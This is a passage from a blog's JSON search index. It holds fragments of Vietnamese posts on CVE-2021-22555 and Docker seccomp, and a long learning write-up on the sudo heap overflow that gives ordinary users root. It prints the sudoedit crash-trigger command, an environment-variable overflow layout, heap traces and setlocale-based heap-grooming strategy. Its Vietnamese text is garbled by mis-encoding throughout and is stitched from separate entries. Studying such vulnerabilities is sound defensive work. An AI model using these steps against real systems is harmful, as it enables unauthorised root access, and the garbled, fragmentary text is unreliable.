c·ªßa root d√≤ng 25-27  T√≥m l·∫°i  B√†i n√†y t√¥i ch·ªâ vi·∫øt l·∫°i t·ª´ b√†i vi·∫øt ch√≠nh c·ªßa t√°c gi·∫£, th√™m v√†o ƒë√≥, l√† nh·ªØng gi·∫£i th√≠ch c·ªßa t√¥i v·ªÅ nh·ªØng v·∫•n ƒë·ªÅ t√°c gi·∫£ ch∆∞a n√≥i r√µ ho·∫∑c qu√° cƒÉn b·∫£n v·ªõi t√°c gi·∫£ nh∆∞ng kh√¥ng h·ªÅ v·ªõi t√¥i. V√¨ ki·∫øn th·ª©c t√¥i c√≤n h·∫°n ch·∫ø, n√™n nh·ªØng gi·∫£i th√≠ch c√≥ th·ªÉ ƒë√∫ng ho·∫∑c sai, n·∫øu sai, r·∫•t mong nh·∫≠n ƒë∆∞·ª£c s·ª± g√≥p ƒë·ªÉ ho√†n thi·ªán h∆°n. L·ªùi cu·ªëi, ch√¢n th√†nh c·∫£m ∆°n s·ª± c·ªëng hi·∫øn c·ªßa t√°c gi·∫£ - Andy Nguyen (theflow@) - ƒë·∫∑c bi·ªát poc c·ªßa anh, ƒë√£ gi√∫p t√¥i r·∫•t nhi·ªÅu trong qu√° tr√¨nh n√¢ng cao kƒ© nƒÉng c·ªßa m√¨nh.  Ngu·ªìn tham kh·∫£o  CVE-2021-22555: Turning \\x00\\x00 into 10000$ CVE-2021-22555: Linux kernel privilege escalation causes Docker to escape  ","description":"L·ªói heap out-of-bound","id":4,"section":"posts","tags":["cve,  escape_docker"],"title":"T√¨m hi·ªÉu v·ªÅ CVE-2021-22555","uri":"https://minhlongmt183.github.io/posts/cve-2021-22555/"},{"content":"Docker security Docker security non-events Protect the Docker daemon socket Using certificates for repository client verification User trusted images Antivirus software AppArmor security profiles Seccomp security profiles Ch·∫ø ƒë·ªô ƒëi·ªán to√°n an to√†n Secure computing mode (seccomp) l√† m·ªôt t√≠nh nƒÉng c·ªßa Linux kernel, d√πng ƒë·ªÉ h·∫°n ch·∫ø m·ªôt s·ªë action trong container. H√†m seccomp() system call d√πng ƒë·ªÉ x·ª≠ l√≠ tr·∫°ng th√°i c·ªßa seccomp.\n","description":"Docker Security","id":5,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v√† s·ª≠ d·ª•ng docker (P8)","uri":"https://minhlongmt183.github.io/posts/docker_p8/"},{"content":"B√†i vi·∫øt n√†y nh·∫±m m·ª•c ƒë√≠ch ghi l·∫°i nh·ªØng ki·∫øn th·ª©c ƒë√£ h·ªçc ƒë·ªÉ nh·ªõ v√† hi·ªÉu r√µ h∆°n.\r T·ªïng quan L·ªói c·ªßa CVE n√†y thu·ªôc lo·∫°i heap-based buffer overflow trong sudo. C·ª• th·ªÉ:\n N√≥ cho ph√©p ng∆∞·ªùi d√πng b√¨nh th∆∞·ªùng l·∫•y ƒë∆∞·ª£c root m√† kh√¥ng c·∫ßn bi·∫øt m·∫≠t kh·∫©u c·ªßa root. Nh·ªØng phi√™n b·∫£n b·ªã ·∫£nh h∆∞·ªüng:  legacy c√≥ phi√™n b·∫£n c·ªßa sudo t·ª´ 1.8.2 - 1.8.31p2 stable c√≥ phi√™n b·∫£n c·ªßa sudo t·ª´ 1.9.0 - 1.9.5p1   Trong b√†i vi·∫øt n√†y, t√¥i ti·∫øn h√†nh khai th√°c tr√™n Ubuntu 18.04.5 LTS c√≥ phi√™n b·∫£n c·ªßa sudo:  1 2 3 4 5 6  edisc@ubuntu:~$ sudo -V\rSudo version 1.9.5p1\rSudoers policy plugin version 1.9.5p1\rSudoers file grammar version 48\rSudoers I/O plugin version 1.9.5p1\rSudoers audit plugin version 1.9.5p1\r  Ph√¢n t√≠ch B·ª©c tranh s∆° l∆∞·ª£c  Khi Sudo ƒë∆∞·ª£c th·ª±c thi ·ªü ch·∫ø ƒë·ªô command line:  N·∫øu s·ª≠ d·ª•ng t√πy ch·ªçn -s, th√¨ Sudo's MODE_SHELL flag s·∫Ω ƒë∆∞·ª£c b·∫≠t. N·∫øu s·ª≠ d·ª•ng t√πy ch·ªçn -i, th√¨ Sudo's MODE_SHELL v√† MODE_LOGIN_SHELL flags s·∫Ω ƒë∆∞·ª£c b·∫≠t.   Khi th·ª±c thi, b·∫Øt ƒë·∫ßu h√†m main() c·ªßa Sudo, h√†m parse_args() s·∫Ω vi·∫øt l·∫°i argv (d√≤ng 609-617) b·∫±ng c√°ch n·ªëi t·∫•t c·∫£ c√°c command-line arguments (d√≤ng 587-595) v√† th√™m v√†o tr∆∞·ªõc c√°c k√≠ t·ª± ƒë·∫∑c bi·ªát m·ªôt d·∫•u backslashes \\. (d√≤ng 590-591):  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  571 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) {\r572 char **av, *cmnd = NULL;\r573 int ac = 1;\r...\r581 cmnd = dst = reallocarray(NULL, cmnd_size, 2);\r...\r587 for (av = argv; *av != NULL; av++) {\r588 for (src = *av; *src != \u0026#39;\\0\u0026#39;; src++) {\r589 /* quote potential meta characters */\r590 if (!isalnum((unsigned char)*src) \u0026amp;\u0026amp; *src != \u0026#39;_\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;-\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;$\u0026#39;)\r591 *dst++ = \u0026#39;\\\\\u0026#39;;\r592 *dst++ = *src;\r593 }\r594 *dst++ = \u0026#39; \u0026#39;;\r595 }\r...\r600 ac += 2; /* -c cmnd */\r...\r603 av = reallocarray(NULL, ac + 1, sizeof(char *));\r...\r609 av[0] = (char *)user_details.shell; /* plugin may override shell */\r610 if (cmnd != NULL) {\r611 av[1] = \u0026#34;-c\u0026#34;;\r612 av[2] = cmnd;\r613 }\r614 av[ac] = NULL;\r615 616 argv = av;\r617 argc = ac;\r618 }\r   Sau ƒë√≥, trong h√†m sudoers_policy_main(), h√†m set_cmnd() n·ªëi t·∫•t c·∫£ c√°c command-line arguments v√†o heap-based buffer \u0026quot;user_args\u0026quot; (d√≤ng) 864-871) v√† b·ªè qua k√≠ t·ª± \\ d√≤ng 866-867.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  819 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) {\r...\r852 for (size = 0, av = NewArgv + 1; *av; av++)\r853 size += strlen(*av) + 1;\r854 if (size == 0 || (user_args = malloc(size)) == NULL) {\r...\r857 }\r858 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {\r...\r864 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {\r865 while (*from) {\r866 if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1]))\r867 from++;\r868 *to++ = *from++;\r869 }\r870 *to++ = \u0026#39; \u0026#39;;\r871 }\r...\r884 }\r...\r886 }\r   N·∫øu command-line argument k·∫øt th√∫c v·ªõi single backslash:  T·∫°i d√≤ng 866, from[0] = '\\\\' v√† from[1]=NULL. T·∫°i d√≤ng 867, from tƒÉng 1 ƒë∆°n v·ªã, from tr·ªè t·ªõi NULL - from=NULL. T·∫°i d√≤ng 868, NULL s·∫Ω ƒë∆∞·ª£c copy v√†o user_args buffer, v√† from tƒÉng 1 ƒë∆°n v·ªã, tr·ªè ƒë·∫øn gi√° tr·ªã sau NULL (out of the argument\u0026rsquo;s bounds). V√≤ng l·∫∑p while t·∫°i d√≤ng 865-869 s·∫Ω ƒë·ªçc v√† copy v√πng d·ªØ li·ªáu out-of-bounds v√†o user_args buffer.   D·ªÖ th·∫•y, set_cmnd() l√† nguy√™n nh√¢n d·∫´n t·ªõi l·ªó h·ªïng heap-based buffer overflow, b·ªüi v√¨ v√πng d·ªØ li·ªáu out-of-bounds ƒë√£ ƒë∆∞·ª£c copy v√†o user_args buffer, tuy nhi√™n n√≥ l·∫°i kh√¥ng ch·ªâ ƒë·ªãnh k√≠ch th∆∞·ªõc c·ªßa ch√∫ng (k√≠ch th∆∞·ªõc ƒë∆∞·ª£c t√≠nh to√°n t·∫°i d√≤ng 852-853) V·ªÅ l√≠ thuy·∫øt, kh√¥ng c√≥ command-line argument n√†o c√≥ th·ªÉ k·∫øt th√∫c b·∫±ng d·∫•u \\ b·ªüi v√¨:  N·∫øu MODE_SHELL hay MODE_LOGIN_SHELL ƒë∆∞·ª£c b·∫≠t (line 858 - ƒëi·ªÅu ki·ªán c·∫ßn ƒë·ªÉ ƒë·∫øn v√πng code b·ªã l·ªói), th√¨ MODE_SHELL ƒë∆∞·ª£c b·∫≠t (d√≤ng 571) v√† h√†m parse_args() s·∫Ω th√™m k√≠ t·ª± \\ v√†o c√°c k√≠ t·ª± ƒë·∫∑c bi·ªát (meta-characters) bao g·ªìm c·∫£ \\ (n√≥ s·∫Ω thay \\ th√†nh \\\\)   Tuy nhi√™n, n·∫øu quan s√°t kƒ©, ch√∫ng ta s·∫Ω th·∫•y ƒëi·ªÅu ki·ªán g·ªçi h√†m c·ªßa set_cmnd() v√† parse_args() c√≥ m·ªôt ch√∫t kh√°c bi·ªát:  1 2 3  819 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) {\r...\r858 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {\r  kh√°c v·ªõi\n1  571 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) {\r   C√¢u h·ªèi ƒë·∫∑t ra ·ªü ƒë√¢y, li·ªáu r·∫±ng ta c√≥ th·ªÉ b·∫≠t m·ªôt trong ba mode MODE_EDIT, MODE_CHECK, MODE_SHELL m√† kh√¥ng c·∫ßn ph·∫£i b·∫≠t MODE_RUN - k√≠ch ho·∫∑c escape code kh√¥ng? C√¢u tr·∫£ l·ªùi h·∫ßu nh∆∞ kh√¥ng th·ªÉ, b·ªüi v√¨:  N·∫øu ta b·∫≠t MODE_EDIT (t√πy ch·ªçn -e, d√≤ng 361) hay MODE_CHECK (t√πy ch·ªçn -l, d√≤ng 423 v√† 519), th√¨ h√†m parse_args() s·∫Ω x√≥a MODE_SHELL t·ª´ valid_flags (d√≤ng 363 v√† 424), tr·∫£ v·ªÅ l·ªói n·∫øu t√¨m th·∫•y invalid flag nh∆∞ MODE_SHELL (d√≤ng 532-533):    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  358 case \u0026#39;e\u0026#39;:\r...\r361 mode = MODE_EDIT;\r362 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;;\r363 valid_flags = MODE_NONINTERACTIVE;\r364 break;\r...\r416 case \u0026#39;l\u0026#39;:\r...\r423 mode = MODE_LIST;\r424 valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;\r425 break;\r...\r518 if (argc \u0026gt; 0 \u0026amp;\u0026amp; mode == MODE_LIST)\r519 mode = MODE_CHECK;\r...\r532 if ((flags \u0026amp; valid_flags) != flags)\r533 usage(1);\r   May m·∫Øn thay, ch√∫ng v·∫´n t·ªìn t·∫°i m·ªôt s∆° h·ªü:  N·∫øu ch√∫ng ta th·ª±c thi Sudo l√† sudoedit thay v√¨ sudo, parse_args() s·∫Ω t·ª± ƒë·ªông b·∫≠t MODE_EDIT (d√≤ng 270) nh∆∞ng kh√¥ng x√≥a c√°c valid_flags, v√† MODE_SHELL l·∫°i n·∫±m trong danh s√°ch c√°c valid_flags n√†y (d√≤ng 127 v√† 249):    1 2 3 4 5 6 7 8 9 10  127 #define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)\r...\r249 int valid_flags = DEFAULT_VALID_FLAGS;\r...\r267 proglen = strlen(progname);\r268 if (proglen \u0026gt; 4 \u0026amp;\u0026amp; strcmp(progname + proglen - 4, \u0026#34;edit\u0026#34;) == 0) {\r269 progname = \u0026#34;sudoedit\u0026#34;;\r270 mode = MODE_EDIT;\r271 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;;\r272 }\r   Vi·ªác n√†y d·∫´n ƒë·∫øn: n·∫øu ch√∫ng ta th·ª±c thi sudoedit -s, sau ƒë√≥ b·∫≠t MODE_EDIT v√† MODE_SHELL nh∆∞ng kh√¥ng b·∫≠t MODE_RUN, ch√∫ng ta s·∫Ω tr√°nh ƒë∆∞·ª£c escape code v√† ƒëi ƒë·∫øn v√πng code b·ªã l·ªói. Sau ƒë√≥, overflow heap-based buffer \u0026ldquo;user_args\u0026rdquo; th√¥ng qua command-line argument m√† k·∫øt th√∫c b·∫±ng d·∫•u backslash.  1 2 3 4 5 6 7 8  edisc@ubuntu:~$ sudo -s \u0026#39;\\\u0026#39; `perl -e \u0026#39;print \u0026#34;A\u0026#34; x 65536\u0026#39;`\r[sudo] password for edisc: Sorry, try again.\r[sudo] password for edisc: sudo: 1 incorrect password attempt\redisc@ubuntu:~$ sudoedit -s \u0026#39;\\\u0026#39; `perl -e \u0026#39;print \u0026#34;A\u0026#34; x 65536\u0026#39;`\rSegmentation fault (core dumped)\redisc@ubuntu:~$\r   D∆∞·ªõi g√≥c nh√¨n c·ªßa k·∫ª t·∫•n c√¥ng, buffer overflow trong tr∆∞·ªùng h·ª£p n√†y kh√° l√≠ t∆∞·ªüng, b·ªüi v√¨:  Ch√∫ng ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c k√≠ch th∆∞·ªõc c·ªßa v√πng nh·ªõ m√† ch√∫ng ta overflow: user_args buffer (d√≤ng 852-854) Ch√∫ng ta ho√†n to√†n ƒë·ªôc l·∫≠p trong vi·ªác ki·ªÉm so√°t k√≠ch th∆∞·ªõc v√† n·ªôi dung c·ªßa v√πng nh·ªõ b·ªã overflow (d√≤ng 852-853) Ch√∫ng ta th·∫≠m ch√≠ c√≥ th·ªÉ vi·∫øt null bytes v√†o v√πng nh·ªõ b·ªã overflow (tham s·ªë ho·∫∑c bi·∫øn m√¥i tr∆∞·ªùng k·∫øt th√∫c b·∫±ng \\ s·∫Ω vi·∫øt 1 null byte v√†o \u0026ldquo;user_args\u0026rdquo; d√≤ng 866-868)   V√≠ d·ª•, tr√™n amd64 Linux, ch√∫ng ta c√≥ th·ªÉ c·∫•p ph√°t 24 bytes trong user-args buffer (32-heap chunk) v√† ghi ƒë√® nh·ªØng field c·ªßa chunk ti·∫øp theo v·ªõi A=a\\0B=b\\0, ghi ƒë√® tr∆∞·ªùng fd v·ªõi C=c\\0D=d\\0 v√† tr∆∞·ªùng bk v·ªõi E=e\\0F=f\\0:  1 2 3 4 5 6 7 8  ------------------------------------------------------------------------\renv -i \u0026#39;AA=a\\\u0026#39; \u0026#39;B=b\\\u0026#39; \u0026#39;C=c\\\u0026#39; \u0026#39;D=d\\\u0026#39; \u0026#39;E=e\\\u0026#39; \u0026#39;F=f\u0026#39; sudoedit -s \u0026#39;1234567890123456789012\\\u0026#39;\r------------------------------------------------------------------------\r--|--------+--------+--------+--------|--------+--------+--------+--------+--\r| | |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.|\r--|--------+--------+--------+--------|--------+--------+--------+--------+--\rsize \u0026lt;---- user_args buffer ----\u0026gt; size fd bk\r  fd: forward\nbk: backward l√† hai con tr·ªè trong c·∫•u tr√∫c heap\r Trace Heap Usages  ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng th·ª±c thi c·ªßa heap, ch√∫ng ta s·∫Ω trace heap usage tr√™n Ubuntu 18.04 t·ª´ malloc,realloc, calloc v√† h√†m free v·ªõi gdb script  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  main()\r|- setlocale(LC_ALL, \u0026#34;\u0026#34;);\r|- tzset()\r|- sudo_conf_read_v1(CONF_DEBUG)\r| |- setlocale(\u0026#34;C\u0026#34;) // l∆∞u v·ªã tr√≠ hi·ªán t·∫°i ƒë·∫ßu ti√™n\r| |- read /etc/sudo.conf\r| |- setlocale(prev_locale) // kh√¥i ph·ª•c l·∫°i locale\r|- sudo_conf_read_v1(CONF_ALL) / gi·ªëng v·ªõi ·ªü tr√™n |- get_user_info()\r| |- getpwuid()\r| | |- parse /etc/nsswitch.conf and create service_user structs\r|- parse_args()\r|- sudo_load_plugins()\r| |- load sudoers.so\r| |- register env hooks\r|- policy_open()\r| |- format_plugin_settings()\r| | |- initialize sudo settings such as network_addrs (many mallocs)\r| |- sudoers_policy_init()\r| | |- init_defaults()\r| | | |- Nhi·ªÅu chu·ªói ng·∫Øn g·ªçi strdup() (k·ªÉ c·∫£ def_timestampdir)\r| | | |- m·ªôt s·ªë chu·ªói g·ªçi dcgettext ƒë·ªÉ c·∫•p ph√°t.\r| | | |- init_envtables() // t·∫°o ra nhi·ªÅu malloc() nh·ªè\r| | |- init_vars()\r| | |- sudo_file_parse() load v√† parse /etc/sudoers\r|- policy_check()\r| |- sudoers_policy_main()\r| | |- set_cmnd()\r  Lu·ªìng th·ª±c thi t·ª´ m·ªôt h√†m x·∫£y ra l·ªói y√™u c·∫ßu password.\n1 2 3 4 5 6 7 8 9 10 11 12 13  |- set_cmnd() // l·ªó h·ªïng ·ªü ƒë√¢y\r|- setlocale(\u0026#34;C\u0026#34;)\r|- sudo_file_lookup() // t√¨m ki·∫øm d·ªØ li·ªáu ƒë∆∞·ª£c ph√¢n t√≠ch t·ª´ /etc/sudoers | |- nss_*\r| | |- nss_load_library()\r|- setlocale(user_locale) // kh√¥i ph·ª•c l·∫°i locale\r|- check_user()\r| |- check_user_interactive()\r| | |- t·∫°o t·ªáp timestamp trong def_timestampdir\r| | |- y√™u c·∫ßu m·∫≠t kh·∫©u (n·∫øu x√°c th·ª±c th·∫•t b·∫°i, tho√°t) |\r|- find_editer()\r| |- call sudoer_hook_env(\u0026#34;SUDO_EDITOR\u0026#34;) // ch·ªâ ƒë∆∞·ª£c g·ªçi n·∫øu x√°c th·ª±c th√†nh c√¥ng.\r  ƒë√£ ch·∫°y gdbscript nh∆∞ng v·∫´n ch∆∞a note l·∫°i ƒë·ªÉ ki·ªÉm tra xem c·∫•u tr√∫c c√≥ gi·ªëng v·ªõi t√°c gi·∫£ ch∆∞a ƒê√£ l√†m ƒë∆∞·ª£c\r X√°c ƒë·ªãnh nh·ªØng ƒë·ªëi t∆∞·ª£ng c√≥ th·ªÉ b·ªã overwriting  V·ªõi lu·ªìng th·ª±c thi tr√™n, c√≥ m·ªôt s·ªë ƒë·ªëi t∆∞·ª£ng (objects) ƒë∆∞·ª£c c·∫•p ph√°t tr∆∞·ªõc khi ch√∫ng ta mu·ªën ti·∫øn h√†nh heap overflow v√† ƒë∆∞·ª£c s·ª≠ d·ª•ng sau ƒë√≥ (l√≠ t∆∞·ªüng cho vi·ªác ghi ƒë√®).  nss service_user object def_timestampdir path compar function pointer in rbtree struct - Con tr·ªè h√†m c√≥ th·ªÉ b·ªã ghi ƒë√® t·ª´ng ph·∫ßn ƒë·ªÉ bypass ASLRS (d√πng m·ªôt ƒëo·∫°n code bruteforcing), tuy nhi√™n tham s·ªë ƒë·∫ßu ti√™n l·∫°i l√† chu·ªói r·ªóng. userspects object from parsing /etc/sudoers: c√≥ kh·∫£ nƒÉng bypass x√°c th·ª±c tr√™n sudo c√≥ phi√™n b·∫£n \u0026gt;= 1.8.9 nh∆∞ng ph·∫£i l√†m gi·∫£ nhi·ªÅu ƒë·ªëi t∆∞·ª£ng (fake many objects).    glibc heap with/without tcache  T·ª´ glibc phi√™n b·∫£n 2.25, tcache ƒë∆∞·ª£c th√™m v√†o heap allocation. So s√°nh gi·ªØa tcache bins v√† fast bins:  Gi·ªëng:  C·∫£ 2 ƒë·ªÅu ƒë√°nh d·∫•u ƒë√£ ƒë∆∞·ª£c s·ª≠ d·ª•ng. ƒê·ªÅu l√† LIFO (Last In, First Out). C√≥ th·ªÉ c·∫•p ph√°t l·∫°i n·∫øu k√≠ch th∆∞·ªõc y√™u c·∫ßu c·∫•p ph√°t tr√πng v·ªõi k√≠ch th∆∞·ªõc c·ªßa bin.   Kh√°c:  Max fast b√≠n size l√† 0x80, c√≤n max tache bins size l√† 0x410. Khi k√≠ch th∆∞·ªõc y√™u c·∫ßu c·∫•p ph√°t l·ªõn h∆°n small bins (0x400), t·∫•t c·∫£ c√°c fast bins ƒë∆∞·ª£c ƒë∆∞a v√†o unsorted bins, sau ƒë√≥ ch√∫ng ƒë∆∞·ª£c t·∫≠p h·ª£p l·∫°i, ƒë∆∞a v√†o bin nh·ªè h∆°n ho·∫∑c l·ªõn h∆°n. C√≥ nhi·ªÅu c·∫•p ph√°t y√™u c·∫ßu kh√≠ch th∆∞·ªõc l·ªõn (nh∆∞ file buffer trong glibc) trong c√°c ch∆∞∆°ng tr√¨nh ch·∫°y ·ªü quy·ªÅn sudo. V·ªõi tache b√≠n, large chunk d∆∞·ª£c c·∫•p ph√°t s·∫Ω kh√¥ng b·ªã ·∫£nh h∆∞·ªüng trong tcahe bins. Nh·ªØng free chunks v·ªõi nh·ªØng k√≠ch th∆∞·ªõc nh·∫•t ƒë·ªãnh s·∫Ω n·∫±m trong tache bin m√£i.      Khai th√°c glibc setlocale  Khi h√†m setlocale ƒë∆∞·ª£c g·ªçi v·ªõi chu·ªói r·ªóng, nh·ªØng bi·∫øn m√¥i tr∆∞·ªùng LC_* ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ ƒë·∫ßu v√†o cho h√†m _nl_find_locale:  1 2 3 4 5 6 7 8 9 10 11 12 13  115 if (cloc_name[0] == \u0026#39;\\0\u0026#39;)\r116 {\r117 /* The user decides which locale to use by setting environment 118 variables*/\r119 cloc_name = getenv(\u0026#34;LC_ALL\u0026#34;);\r120 if (!name_present(cloc_name))\r121 cloc_name = getenv(_nl_category_name.str 122 + _nl_category_name_idxs[category]);\r123 if (!name_present(cloc_name))\r124 cloc_name = getenv(\u0026#34;LANG\u0026#34;);\r125 if (!name_present(cloc_name))\r126 cloc_name = _nl_C_name;\r127 }\r   ƒêo·∫°n code tr√™n, ta th·∫•y ∆∞u ti√™n cho vi·ªác l·∫•y locale name cho m·ªói danh m·ª•c l√† LC_ALL, LC_\u0026lt;CATEGORY_NAME\u0026gt;, LANG environment. N·∫øu kh√¥ng c√≥ g√¨ ƒë∆∞·ª£c thi·∫øt l·∫≠p, special locale name \u0026quot;C\u0026quot; ƒë∆∞·ª£c s·ª≠ d·ª•ng. N·∫øu locale name l√† \u0026ldquo;C\u0026rdquo;, h√†m _nl_find_locale s·∫Ω tr·∫£ v·ªÅ ngay l·∫≠p t·ª©c m√† kh√¥ng ƒëi t·ªõi heap, v·ªõi nh·ªØng t√™n kh√°c, flow s·∫Ω nh∆∞ sau:  1 2 3 4 5 6 7 8 9 10 11  185 /*LOCALE can consist of up to four recognized parts for the XPG syntax:\r186 language[_territory[.codeset]][@modifier]\r187 188 Beside the first all of them are allowed to be missing. If the full specified locale is not found, the less specific one are looked for. The various part will be stripped off according to the following order:\r189 (1) codeset\r190 (2) normalized codeset\r191 (3) territory\r192 (4) modifier */\rmask = _nl_explode_name (loc_name, \u0026amp;language, \u0026amp;modifier, \u0026amp;territory, \u0026amp;codeset, \u0026amp;normalized_codeset);\r  Gi√° tr·ªã tr·∫£ v·ªÅ mark l√† c·ªù ƒë·ªÉ ch·ªâ ra s·ª± t·ªìn t·∫°i c·ªßa c√°c ph·∫ßn n√†y trong locale name ƒë∆∞·ª£c nh·∫≠n. Sau ƒë√≥ h√†m _nl_make_l10nflist ƒë∆∞·ª£c g·ªçi ƒë·ªÉ ki·ªÉm tra li·ªáu locale name ƒë√£ nh·∫≠n c√≥ ƒë∆∞·ª£c t·∫£i l√™n hay ch∆∞a? ƒêi·ªÅu n√†y y√™u c·∫ßu malloc ƒë·ªÉ l∆∞u ƒë·∫ßy ƒë·ªß t√™n th∆∞ m·ª•c. N·∫øu n√≥ n·∫±m trong danh s√°ch/l·ªánh g·ªçi ch·ªâ ƒë·ªÉ nh·∫≠n, gi·∫£i ph√≥ng n√≥ r·ªìi tr·∫£ v·ªÅ.\n1 2 3 4 5 6 7 8 9 10 11 12  165 /*Allocate room for the full file name. */\r166 abs_filename = (char *) malloc(dirlist_len\r167 + strlen(language)\r168 + ((mask \u0026amp; XPG_TERRITORY) != 0\r169 ? strlen (codeset) + 1 : 0)\r170 + ((mask \u0026amp; XPG_CODESET) != 0\r171 ? strlen(normalized_codeset) + 1 : 0)\r172 + ((mask \u0026amp; XPG_NORM_CODESET) != 0\r173 ? strlen(normalized_codeset) + 1 : 0)\r174 + ((mask \u0026amp; XPG_MODIFIER) != 0\r175 ? strlen(modifier) + 1 : 0)\r176 + 1 + strlen(filename) +1);\r   N·∫øu locale name kh√¥ng n·∫±m trong danh s√°ch ƒë∆∞·ª£c load, h√†m _nl_make_l10nflist ƒë∆∞·ª£c g·ªçi m·ªôt l·∫ßn n·ªØa ƒë·ªÉ t·∫°o ra t·∫•t c·∫£ c√°c ƒë∆∞·ªùng d·∫´n c√≥ th·ªÉ (ƒë∆∞·ªùng d·∫´n c∆° b·∫£n l√† /usr/lib/locale) t·ª´ vi·ªác k·∫øt h·ª£p nh·ªØng th√†nh ph·∫ßn v√† ƒë·∫∑c t√≠nh c·ªßa t√™n b·∫±ng g·ªçi ƒë·ªá quy ch√≠nh ƒë√≥ v·ªõi \u0026ldquo;mask\u0026rdquo; ƒë√£ ƒë∆∞·ª£c s·ª≠a ƒë·ªïi. Thu·∫≠t to√°n n√†y s·∫Ω t·∫°o ra m·ªôt duplicated part (malloc) v√† r·ªìi x√≥a n√≥ (free) sau khi ki·ªÉm tra xong. C√†ng nhi·ªÅu th√†nh ph·∫ßn trong locales th√¨ s·∫Ω c√≥ c√†ng nhi·ªÅu h√†m malloc v√† free ƒë∆∞·ª£c g·ªçi. Sau ƒë√≥, h√†m _nl_find_locale c·ªë g·∫Øng load locale data t·ª´ t·ª´ng ƒë∆∞·ªùng d·∫´n m·ªôt. N·∫øu t√¨m th·∫•y m·ªôt locale data h·ª£p l·ªá, h√†m setlocale s·∫Ω sawpx x·∫øp t√™n mi·ªÅn nh·∫•t ƒë·ªãnh v√† l∆∞u n√≥ trong n·ªôi b·ªô. N·∫øu c√≥ l·ªói x·∫£y ra, h√†m setlocale s·∫Ω gi·∫£i ph√≥ng t·∫•t c·∫£ c√°c t√™n ƒë√£ ƒë∆∞·ª£c l∆∞u v√† m·∫∑c ƒë·ªãnh s·ª≠ d·ª•ng C r·ªìi tr·∫£ v·ªÅ ngay l√¢p t·ª©c. Do ƒë√≥, locale name kh√¥ng th·ªÉ ng·∫´u nhi√™n, √≠t nh·∫•t ng√¥n ng·ªØ v√† b·ªô m√£ ph·∫£i h·ª£p l·ªá. Sau khi t·∫•t c·∫£ t√™n danh m·ª•c ƒë·ªÅu ƒë∆∞·ª£c strdup() v√† d·ªØ li·ªáu ƒë∆∞·ª£c load, LC_ALL s·∫Ω ƒë∆∞·ª£c t·∫°o trong h√†m new_composite_name. N·∫øu t·∫•t c·∫£ c√°c t√™n LC gi·ªëng nhau, gi√° tr·ªã c·ªßa n√≥ s·∫Ω ch·ªâ ƒë∆∞·ª£c l·∫•y t·ª´ t√™n ƒë·∫ßu ti√™n, ng∆∞·ª£c l·∫°i, n·∫øu kh√¥ng gi·ªëng, gi√° tr·ªã s·∫Ω ƒë∆∞·ª£c k·∫øt h·ª£p l·∫°i v·ªõi nhau.  Ki·ªÉm so√°t heap usage b·∫±ng bi·∫øn m√¥i tr∆∞·ªùng. M·ªôt s·ªë gi√° tr·ªã c·ªßa bi·∫øn m√¥i tr∆∞·ªùng gi√∫p cho vi·ªác khai th√°c l·ªói n√†y:\n Thi·∫øt l·∫≠p m√¥i tr∆∞·ªùng \u0026quot;TZ=:\u0026quot;: gi·∫£m s·ªë l·∫ßn s·ª≠ d·ª•ng heap trong h√†m glibc tzset() v√† ho√†n to√†n c√≥ th·ªÉ ti√™n ƒëo√°n tr∆∞·ªõc. Th√™m \u0026quot;;x=x\u0026quot; trong m·ªçi bi·∫øn m√¥i tr∆∞·ªùng LC, lu·ªìng th·ª±c thi s·∫Ω nh∆∞ sau:  ƒê·∫ßu ti√™n, h√†m setlocale(\u0026quot;\u0026quot;) s·∫Ω c·∫•p ph√°t v√† gi·∫£i ph√≥ng m·ªôt c√°ch b√¨nh th∆∞·ªùng, LC_ALL s·∫Ω c√≥ gi√° tr·ªã \u0026quot;...;x=x;...\u0026quot; Sau ƒë√≥, setlocale(NULL) l·∫•y gi√° tr·ªã LC_ALL hi·ªán t·∫°i v√† l∆∞u l·∫°i. setlocale(\u0026quot;C\u0026quot;) s·∫Ω gi·∫£i ph√≥ng t·∫•t c·∫£ locale name nh·∫≠n ƒë∆∞·ª£c. setlocale(saved_LC_ALL) s·∫Ω kh√¥ng l√†m g√¨, v√¨ x l√† t√™n danh m·ª•c kh√¥ng h·ª£p l·ªá. T·ªõi ƒë√¢y, LC_ALL trong glibc l√† \u0026ldquo;C\u0026rdquo; setlocale s·∫Ω kh√¥ng l√†m g√¨ b·ªüi v√¨ LC_ALL l√† C K·∫øt qu·∫£ ch√∫ng ta s·∫Ω c√≥ m·ªôt v√πng ƒë∆∞·ª£c gi·∫£i ph√≥ng v·ªõi k√≠ch th∆∞·ªõc ƒë∆∞·ª£c ki·ªÉm so√°t b·∫±ng c√°ch thi·∫øt l·∫≠p m√¥i tr∆∞·ªùng LC    C·∫•u tr√∫c service_user 1 2 3 4 5 6 7 8 9 10 11 12 13  typedef struct 